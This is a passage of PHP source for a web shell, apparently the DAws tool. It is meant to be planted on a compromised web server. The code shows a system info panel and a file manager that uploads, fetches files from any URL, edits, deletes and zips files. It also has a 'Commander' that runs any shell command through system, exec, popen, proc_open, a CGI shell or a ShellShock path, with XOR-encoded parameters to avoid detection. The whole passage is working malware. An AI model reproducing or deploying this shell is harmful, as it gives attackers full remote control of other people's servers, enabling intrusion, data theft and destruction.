			$tempcommand = base64encoding("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
			echo "<td>".round(url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand"))."%</td>\n";	
		}
		else if($shsh == True)
		{
			echo "<td>".round(shsh("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'"))."%</td>\n";
		}
		else
		{
			echo "<td></td>\n";
		}	
	}

	echo "
	</tr>

	<tr>
		<td>Total RAM</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$wmi = new COM('WinMgmts:root/cimv2');
		$res = $wmi->ExecQuery('Select TotalPhysicalMemory from Win32_ComputerSystem');
		$system = $res->ItemIndex(0);
		printf(
			'<td>%d GB</td>', 
			$system->TotalPhysicalMemory / 1024 /1024 /1024
		);
	}
	else
	{
		if ($shell_exec == True)
		{
			$total_ram = shell_exec("free -mt | grep Mem |awk '{print $2}'");
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($exec == True)
		{
			$total_ram = exec("free -mt | grep Mem |awk '{print $2}'");
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($popen == True)
		{
			$pid = popen("free -mt | grep Mem |awk '{print $2}'","r");
			$total_ram = fread($pid, 4096);
			pclose($pid);
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($proc_open == True)
		{
			$process = proc_open(
				"free -mt | grep Mem |awk '{print $2}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					$total_ram = $stdout;
					$total_ram = $total_ram /1024;
					echo "<td>" . round($total_ram) . " GB</td>\n";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else if($cgi == True)
		{
			$tempcommand = base64encoding("free -mt | grep Mem |awk '{print $2}'");
			$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");	
			$total_ram = $stdout;
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($shsh == True)
		{
			$data = shsh("free -mt | grep Mem |awk '{print $2}'");
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else
		{
			echo "<td></td>";
		}	
	}

	echo "
	</tr>
	
	<tr>
		<td>Free RAM</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		if ($shell_exec == True)
		{
			$free_ram = (int)str_replace("FreePhysicalMemory=", "", shell_exec("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
			echo "<td>" . round($free_ram, 2) . "GB </td>";
		}
		else if ($exec == True)
		{
			$free_ram = (int)str_replace("FreePhysicalMemory=", "", exec("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
			echo "<td>" . round($free_ram, 2) . "GB </td>";
		}
		else if($popen == True)
		{
			$pid = popen("wmic OS get FreePhysicalMemory /Value","r");
			$tempoutput = fread($pid, 4096);
			pclose($pid);

			$free_ram = (int)str_replace("FreePhysicalMemory=", "", $tempoutput) /1024 /1024;
			echo "<td>" . round($free_ram, 2) . "GB </td>";
		}
		else if($proc_open == True)
		{
			$process = proc_open(
				"wmic OS get FreePhysicalMemory /Value",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					$free_ram = (int)str_replace("FreePhysicalMemory=", "", $stdout) /1024 /1024;
					echo "<td>" . round($free_ram, 2) . "GB </td>";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else if($cgi == True)
		{
			$tempcommand = base64encoding("wmic OS get FreePhysicalMemory /Value");
			$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
			$free_ram = (int)str_replace("FreePhysicalMemory=", "", $stdout) /1024 /1024;
			echo "<td>" . round($free_ram, 2) . "GB </td>";
		}
		else if($shsh == True)
		{
			$free_ram = (int)str_replace("FreePhysicalMemory=", "", shsh("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
			echo "<td>" . round($free_ram, 2) . "GB </td>";
		}
		else
		{
			echo "<td></td>";
		}
	}
	else
	{
		if ($shell_exec == True)
		{
			$free_ram = shell_exec("free | grep Mem | awk '{print $3/$2 * 100.0}'");
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($exec == True)
		{
			$free_ram = exec("free | grep Mem | awk '{print $3/$2 * 100.0}'");
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($popen == True)
		{
			$pid = popen("free | grep Mem | awk '{print $3/$2 * 100.0}'","r");
			$free_ram = fread($pid, 4096);
			pclose($pid);
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($proc_open == True)
		{
			$process = proc_open(
				"free | grep Mem | awk '{print $3/$2 * 100.0}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					$free_ram = $stdout;
					echo "<td>" . round($free_ram) . "% </td>\n";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else if($cgi == True)
		{
			$tempcommand = base64encoding("free | grep Mem | awk '{print $3/$2 * 100.0}'");
			$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
			$free_ram = $stdout;
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($shsh == True)
		{
			$free_ram = shsh("free | grep Mem | awk '{print $3/$2 * 100.0}'");
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else
		{
			echo "<td></td>";
		}	
	}
	echo "
	</tr>";
	#<--

if ($disbls == ",")
{
	$disbls = "<p class='success'>Nothing is Disabled</p>";
}

echo "
</table>
</td>
<td>
<table class='flat-table flat-table-2'>
	<tr>
		<th>Name</th>
		<th>Value</th>
	</tr>
	<tr>
		<td>Your IP</td>
		<td>".$_SERVER['REMOTE_ADDR']."</td>
	</tr>
	<tr>
		<td>Your UA</td>
		<td>".$_SERVER['HTTP_USER_AGENT']."</td>
	</tr>
	<tr>
		<td>Writeable/Readable Dir</td>
		<td>$writeread_dir</td>
	</tr>
	<tr>
		<td>CGI Shell</td>
		<td>".$_SESSION["onlinecgi"]."</td>
	</tr>
	<tr>
		<td>Encryption/Encoding Key</td>
		<td>".$_SESSION["key"]."</td>
	</tr>
</table>
</td>
</tr>
</table>
<table style='table-layout: fixed; word-wrap:break-word' class='flat-table flat-table-1' style='max-width: 500px;'>
	<tr>
		<th>Disabled</th>
	</tr>
	<tr>
		<td>$disbls</td>
	</tr>
</table>
";

?>

<br><h3><A NAME='File Manager' href='#File Manager'>File Manager</A></h3>

<?php

#Uploaders-->
if(isset($_FILES["fileToUpload"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$target_dir = unxor_this($_GET["location"])."\\";
	}
	else
	{
		$target_dir = unxor_this($_GET["location"])."/";
	}
	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
	$uploadOk = 1;

	if (file_exists($target_file))
	{
		$uploadOk = 0;
	}
	
	if ($uploadOk == 0)
	{
		echo "<p class='danger'>File with same name already exists.</p>";
	}	
	else
	{
		if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file))
		{
			echo "<p class='success'>The file ".basename($_FILES["fileToUpload"]["name"])." has been uploaded.</p>";
			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
		}
		else
		{
			echo "<p class='danger'>Sorry, there was an error uploading your file.</p>";
		}	
	}
}

else if(isset($_POST["linkToDownload"]))
{
	$url = $_POST["linkToDownload"];
	
	if ($url != "")
	{
		$pieces = explode("/", $url);
		$filename = array_pop($pieces);

		echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			$target_dir = unxor_this($_GET["location"])."\\";
		}		
		else
		{
			$target_dir = unxor_this($_GET["location"])."/";
		}

		$fp = fopen ($target_dir.$filename, 'w+');

		$uploadOk = 1;
		if (file_exists($target_dir.$filename))
		{
			$uploadOk = 0;
		}
				
		if ($uploadOk == 0)
		{
			echo "<p class='danger'>File with same name already exists.</p>";
		}		
		else
		{
			try
			{
				if ($curl_version == True)
				{
					$ch = curl_init(str_replace(" ","%20",$url));

					curl_setopt($ch, CURLOPT_TIMEOUT, 60);

					curl_setopt($ch, CURLOPT_FILE, $fp);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);

					$data = curl_exec($ch);

					curl_close($ch);
				}
				else
				{
					file_put_contents($target_dir.$filename, file_get_contents($url));	
				}

				echo "<p class='success'>The file ".$filename." has been uploaded.</p>";
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
			}
			catch(Exception $e)
			{
				echo "<p class='danger'>Sorry, there was an error uploading your file.</p>";
			}	
		}
	}
	else
	{
		echo "<p class='danger'>Required Link not provided.</p>";
	}
}
#<--

#Creates a Dir-->
else if(isset($_POST["mkdir"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$dirname = unxor_this($_GET["location"])."\\".$_POST["mkdir"];
	}
	else
	{	
		$dirname = unxor_this($_GET["location"])."/".$_POST["mkdir"];
	}

	if (!file_exists($dirname))
	{
		mkdir($dirname);
		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
	}
	else
	{
		echo "<p class='danger'>Dir already exists!</p>";
	}
}
#<--

#Creates a File-->
else if(isset($_POST["mkfile"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = unxor_this($_GET["location"])."\\".$_POST["mkfile"];
	}
	else
	{
		$filename = unxor_this($_GET["location"])."/".$_POST["mkfile"];
	}

	if (!file_exists($filename))
	{
		fopen($filename, 'w');
		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
	}
	else
	{
		echo "<p class='danger'>File already exists!</p>";
	}
}
#<--

#Removes a File/Dir-->
else if(isset($_GET["del"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
	if (is_dir(unxor_this($_GET["del"])))
	{
		if (rrmdir(unxor_this($_GET["del"])) == False)
		{
			echo "<p class='danger'>".unxor_this($_GET["del"])." cannot be Deleted.</p>";
		}
		else
		{
			echo "<p class='success'>".unxor_this($_GET["del"])." has been Deleted.</p>";
			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
		}
	}
	else
	{
		if (unlink(unxor_this($_GET["del"])) == False)
		{
			echo "<p class='danger'>".unxor_this($_GET["del"])." cannot be Deleted.</p>";
		}
		else
		{
			echo "<p class='success'>".unxor_this($_GET["del"])." has been Deleted.</p>";
			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
		}
	}	
}
#<--

#Zips a Dir-->
else if(isset($_GET["zip"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	$archiveName = unxor_this($_GET["zip"]);

	if (file_exists(unxor_this($_GET["zip"])))
	{
		if(is_dir(unxor_this($_GET["zip"])))
		{
			if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
			{	
				$folder = array_pop(explode("/", unxor_this($_GET['zip'])));

				$file = $folder . ".zip";
				
				zipWindows($file, unxor_this($_GET['zip']));

				chm0dit($file, 0644, "644");
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename='.basename($file));
				header('Expires: 0');
				header('Cache-Control: must-revalidate');
				header('Pragma: public');
				header('Content-Length: ' . filesize($file));
				ob_clean();
				flush();
				readfile($file);	
			}
			else
			{
				if(evalRel("zip -r $archiveName $archiveName")=="False")
				{
					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system', 'passthru', `popen`, `proc_open`, `cgi` and `shellshock` are Disabled.</p>";
					$zipFail = True;
				}

				if ($zipFail == False)
				{
					echo "<p class='success'>".unxor_this($_GET["zip"])." has been Ziped.</p>";
					header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
				}	
			}
		}
		else
		{
			echo "<p class='danger'>This ain't no dir mate.</p>";
		}
	}
	else
	{
		echo "<p class='danger'>Dir doens't exist.</p>";
	}
}
#<--

#Edits a File-->
else if(isset($_GET["file"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a><br>";

	if(isset($_POST["save"]))
	{
		if(is_writable(unxor_this($_GET["file"])))
		{
			file_put_contents(unxor_this($_GET["file"]), unxor_this($_POST["content"]));
			if(file_get_contents(unxor_this($_GET["file"])) == unxor_this($_POST["content"]))
			{
				echo "<p class='success'>Change was successful!</p>";
			}
			else
			{
				echo "<p class='danger'>Change was not successful!</p>";
			}		
		}
		else
		{
			echo "<p class='danger'>This file is not writable!</p>";
		}	
	}

	if(is_readable(unxor_this($_GET["file"])))
	{
		$file = unxor_this(htmlentities($_GET["file"]));
		$content = file_get_contents(unxor_this($_GET["file"]));
		echo "
			<form action='".$_SERVER['PHP_SELF']."?file=".xor_this($file)."&location=".$_GET["location"]."#File Manager' method='POST'>
				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>
				<input type='submit' name='save' value='Save' onclick='return xorencr5(this.form, this.form.content);'/>
			</form>";
	}
	else
	{
		echo "<p class='danger'>File is not readable!</p>";
	}
}
#<--

#Renames a File/Dir-->
else if(isset($_GET["rename_file"]) && !empty($_GET["rename_file"]))
{
	echo "<a href='?dir=".$_GET["dir"]."#File Manager'>Go Back</a><br><br>";

	if(isset($_POST["rename_file"]))
	{
		if(file_exists(unxor_this($_POST["original_name"]))) 
		{
			rename(unxor_this($_POST["original_name"]), unxor_this($_POST["new_name"]));
			if(file_exists(unxor_this($_POST["new_name"])))
			{
				echo "<p class='success'>File successfully renamed!</p>";
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]."#File Manager");
			}
			else
			{
				echo "<p class='danger'>Could not rename file!</p>";
			}		
		} 
		else
		{
			echo "<p class='danger'>Could not find file!</p>";
		}	
	}

	$rename = htmlentities(unxor_this($_GET["rename_file"]));
	echo "<form action='' method='POST'>
		<input type='hidden' name='original_name' value='$rename'>	
		<input type='text' name='new_name' value='$rename'>
		<input type=\"submit\" name=\"rename_file\" value=\"Rename\" onclick=\"return xorencr3(this.form, this.form.original_name, this.form.new_name);\"/>
	</form>";
}
else if(isset($_GET["rename_folder"]) && !empty($_GET["rename_folder"]))
{
	echo "<a href='?dir=".$_GET["dir"]."#File Manager'>Go Back</a><br><br>";

	if(isset($_POST["rename_folder"]))
	{
		if(file_exists(unxor_this($_POST["original_name"]))) 
		{
			rename(unxor_this($_POST["original_name"]), unxor_this($_POST["new_name"]));
			if(file_exists(unxor_this($_POST["new_name"])))
			{
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]."#File Manager");
				echo "<p class='success'>File successfully renamed!</p>";
			}
			else
			{
				echo "<p class='danger'>Could not rename file!</p>";
			}		
		}
		else
		{
			echo "<p class='danger'>Could not find file!</p>";
		}	
	}

	$rename = htmlentities(unxor_this($_GET["rename_folder"]));
	echo "<form action='' method='POST'>
		<input type='hidden' name='original_name' value='$rename'>	
		<input type='text' name='new_name' value='$rename'>
		<input type=\"submit\" name=\"rename_folder\" value=\"Rename\" onclick=\"return xorencr3(this.form, this.form.original_name, this.form.new_name);\"/>
	</form>";
}
#<--

else
{
	if (isset($_GET['dir'])) 
	{
		#Downloads a File-->
		if (isset($_GET['download']) && isset($_GET['location']))
		{
			if (is_readable(unxor_this($_GET['location'])))
			{
				$file = unxor_this($_GET['location']);
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename='.basename($file));
				header('Expires: 0');
				header('Cache-Control: must-revalidate');
				header('Pragma: public');
				header('Content-Length: ' . filesize($file));
				ob_clean();
				flush();
				readfile($file);
			}
			else
			{
				echo "<p class='danger'>File is not readable!</p>";
			}		
		}
		#<--		

		$dir = unxor_this($_GET['dir']);
		$size = strlen($dir);
		while ($dir[$size - 1] == '/') 
		{
			$dir = substr($dir, 0, $size - 1);
			$size = strlen($dir);
		}
	}
	else
	{
		$dir = $_SERVER["SCRIPT_FILENAME"];
		$size = strlen($dir);
		while ($dir[$size - 1] != '/') 
		{
			$dir = substr($dir, 0, $size - 1);
			$size = strlen($dir);
		}
		$dir = substr($dir, 0, $size - 1);
	}

	if (is_dir($dir))
	{
		echo "
		<table class='flat-table flat-table-3'>
			<tr>
				<td>Shell's Directory: <a href='?dir=".xor_this(getcwd())."#File Manager'>".getcwd()."</a></td>
			</tr>
			<tr>
				<td>Current Directory: ".htmlspecialchars($dir)."</td>
			</tr>
			<tr>
				<td>Change Directory/Read File:
				<form action='#File Manager' method='get' >
					<input style='width:300px' name='dir' type='text' value='".htmlspecialchars($dir)."'/>
					<input type='submit' value='Change' name='Change' onclick='return xorencr4(this.form, this.form.dir);'/>
				</form>
				</td>
			</tr>
		</table>";

		#File Manager-->
		if (is_readable($dir))
		{
			if ($handle = opendir($dir)) 
			{
				$rows = array();

				$size_document_root = strlen($_SERVER['DOCUMENT_ROOT']);
				$pos = strrpos($dir, "/");
				$topdir = substr($dir, 0, $pos + 1);
				$i = 0;
				while (false !== ($file = readdir($handle))) 
				{
					if ($file != "." && $file != "..") 
					{
						$rows[$i]['data'] = $file;
						$rows[$i]['dir'] = is_dir($dir . "/" . $file);
						$i++;
					}
				}
				closedir($handle);

				$size = count($rows);
				
				echo "
				<table class='flat-table flat-table-1'>
					<tr>
						<th>Type</th>
						<th>Name</th>
						<th>Size (bytes)</th>
						<th>Permissions</th>
						<th>Actions</th>
					</tr>

					<tr>
						<td>[UP]</td>
						<td><a href='", $_SERVER['PHP_SELF'], "?dir=", xor_this($topdir), "#File Manager'>..</a></td>
						<td></td>
						<td></td>
						<td></td>
					</tr>";

				if($size != 0)
				{
					$rows = sortRows($rows);

					for ($i = 0; $i < $size; ++$i)
					{
						$topdir = $dir . "/" . $rows[$i]['data'];
						echo "
						<tr>
							<td>";
						if ($rows[$i]['dir']) 
						{
							echo "[DIR]";
							$file_type = "dir";
						}
						else 
						{
							echo "[FILE]";
							$file_type = "file";
						}
						
						echo "
							</td>";
					
						if (is_readable($topdir))
						{					
							echo "
							<td><a href='", $_SERVER['PHP_SELF'], "?dir=", xor_this($topdir), "#File Manager'>", htmlspecialchars($rows[$i]['data']), "</a></td>";
						}						
						else
						{
							echo "
							<td>".htmlspecialchars($rows[$i]['data'])."</td>";
						}
							
						if (is_readable($topdir))
						{
							$locsize = filesize($topdir);
						}						
						else
						{
							$locsize = "";
						}
						
						echo "
							<td>".$locsize."</td>";
						echo "
							<td>".getPermission($topdir)."</td>";
						if ($file_type == "dir")
						{
							if ((is_writeable($topdir)) && (is_readable($topdir)))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_folder=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?zip=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Zip</a></td>";
							}
							else if (is_writeable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_folder=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?zip=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Zip</a></td>";
							}
							else
							{
								echo "
								<td></td>";
							}						
						}
						else
						{
							if ((is_readable($topdir)) && (is_writeable($topdir)))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a> | <a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
							}				
							else if (is_readable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a></td>";
							}							
							else if (is_writeable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
							}					
							else
							{
								echo "
								<td></td>";
							}
						}
						echo "
						</tr>";
					}
				}
				else
				{
					echo "
						<p class='danger'>Dir is Empty!</p>";
				}

				echo "
					</table>";

				if (!is_writeable($dir))
				{
					echo "
						<p class='danger'>Dir is not writeable! You can't upload files to this Directory!</p>
						
						<table class='flat-table flat-table-3' style='display:none'>\n";
				}				
				else
				{
					echo "<table class='flat-table flat-table-3'>";
			
				}				
				echo "
					<tr>
						<form action='?location=".xor_this($dir)."#File Manager' method='post' enctype='multipart/form-data'>
							<td>Upload File (Browse):</td>
							<td><input type='file' value='Browse' name='fileToUpload'/></td>
							<td><input type='submit' value='Upload' name='uploadFile'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".xor_this($dir)."#File Manager' method='post' >
							<td>Upload File (Link):</td>
							<td><input style='width:300px' name='linkToDownload' type='text'/><br><small>Direct Links required!</small></td>
							<td><input type='submit' value='Upload' name='downloadLink'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".xor_this($dir)."#File Manager' method='post'>
							<td>Create File:</td>
							<td><input style='width:300px' name='mkfile' type='text'/></td>
							<td><input type='submit' value='Create' name='createFile'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".xor_this($dir)."#File Manager' method='post'>
							<td>Create Folder:</td>
							<td><input style='width:300px' name='mkdir' type='text'/></td>
							<td><input type='submit' value='Create' name='createDir'/></td>
						</form>
					</tr>
				</table>";
			}
		}
		else
		{
			echo "<p class='danger'>Dir is not readable!</p>";
		}
		#<--
	}
	else if (is_file($dir))
	{
		#--> File Viewer
		if(is_readable($dir))
		{
			$file = htmlentities($dir);
			$content = file_get_contents($dir);
			echo "
				<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($dir))."#File Manager'>Go Back</a><br>
				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>";
		}
		else
		{
			echo "
				<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($dir))."#File Manager'>Go Back</a><br>
				<p class='danger'>File is not readable!</p>";
		}
		#<--
	}
}

#Commander-->
if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
{
echo "
<br><h3><A NAME='Commander' href=\"#Commander\">Commander</A></h3>";

if ($cgi == True)
{
	echo "<p class='danger'>Reminder: the CGI Shell's directory is different than DAws's current directory.</p>";
}

echo "
<form action='#Commander' method='POST'>";

if(isset($_POST["system"])) $_SESSION["command_function"] = "system";
if(isset($_POST["shell_exec"])) $_SESSION["command_function"] = "shell_exec";
if(isset($_POST["exec"])) $_SESSION["command_function"] = "exec";
if(isset($_POST["passthru"])) $_SESSION["command_function"] = "passthru";
if(isset($_POST["popen"])) $_SESSION["command_function"] = "popen";
if(isset($_POST["proc_open"])) $_SESSION["command_function"] = "proc_open";
if(isset($_POST["cgi"])) $_SESSION["command_function"] = "cgi";
if(isset($_POST["shsh"])) $_SESSION["command_function"] = "shsh";
if(!isset($_SESSION["command_function"])) $_SESSION["command_function"] = "system";

if($system == True)
{
	echo '<input type="submit" name="system" value="System" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "system")
	{
		echo ' style="background-color: red;"';
	}	
	if(!isset($_SESSION["command_function"]))
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($shell_exec == True)
{
	echo '<input type="submit" name="shell_exec" value="Shell_exec" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shell_exec")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($exec == True)
{
	echo '<input type="submit" name="exec" value="Exec" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "exec")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($passthru == True)
{
	echo '<input type="submit" name="passthru" value="Passthru" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "passthru")
	{
		echo ' style="background-color: red;"';
	}	
	
	echo "> ";
}

if($popen == True)
{
	echo '<input type="submit" name="popen" value="Popen" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "popen")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($proc_open == True)
{
	echo '<input type="submit" name="proc_open" value="Proc_open" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "proc_open")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if ($cgi == True)
{
	echo '<input type="submit" name="cgi" value="CGI" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "cgi")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if ($shsh == True)
{
	echo '<input type="submit" name="shsh" value="ShellShock" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shsh")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}
echo "
</form>

<form action='#Commander' method='post'>
	<input type='text' style='width:300px' name='command' placeholder='Command...'>
	<input type=\"submit\" value=\"GO\" onclick=\"return xorencr(this.form, this.form.command);\" />
</form>";
}

if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "system" || isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "passthru")
{
	if(isset($_POST["command"]))
	{
		$decCommand = unxor_this($_POST["command"]);
		if($_SESSION["command_function"] == "system")
		{
			echo "<table class='flat-table flat-table-1'>";
			echo "<td>".$decCommand."</td>";
			echo "<td><pre>";
			system($decCommand." 2>&1");
			echo "</pre></td>";
			echo "</table>";
		}
		else
		{
			echo "<table class='flat-table flat-table-1'>";
			echo "<td>".$decCommand."</td>";
			echo "<td><pre>";
			passthru($decCommand." 2>&1");
			echo "</pre></td>";
			echo "</table>";		
		}
	}
}
else
{
	if(isset($_SESSION["directory"]))
	{
		if(file_exists($_SESSION["directory"]))
		{
			chdir($_SESSION["directory"]);
		}	
	}
	if(isset($_POST["command"]))
	{
		$decCommand = unxor_this($_POST["command"]);
		$parts = explode(" ", $decCommand);
		if($decCommand != "clear" && $decCommand != "cls" && $parts[0] != "cd")
		{
			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shell_exec")
			{
				$response = shell_exec($decCommand." 2>&1");
			}
			
			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "exec")
			{
				$response = exec($decCommand." 2>&1");
			}

			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "popen")
			{
				$pid = popen($decCommand." 2>&1","r");
				$response = fread($pid, 4096);
				pclose($pid);
			}

			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "proc_open")
			{
				$process = proc_open(
					$decCommand." 2>&1",	
					array(
						0 => array("pipe", "r"),
						1 => array("pipe", "w"),
						2 => array("pipe", "w"),
					),
					$pipes
				);
	
				if ($process !== false)
				{
					$stdout = stream_get_contents($pipes[1]);
					$stderr = stream_get_contents($pipes[2]);
					fclose($pipes[1]);
					fclose($pipes[2]);
					proc_close($process);
		
					if ($stderr != "")
					{
						$response = $stderr;
					}
					else
					{
						$response = $stdout;
					}
				}
				else
				{
					$response = "Fail";
				}
			}
			
			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "cgi")
			{
				$decCommand = base64encoding($decCommand);
				$response = url_get_contents($_SESSION["onlinecgi"]."?command=$decCommand");				
				$decCommand = base64decoding($decCommand);
			}

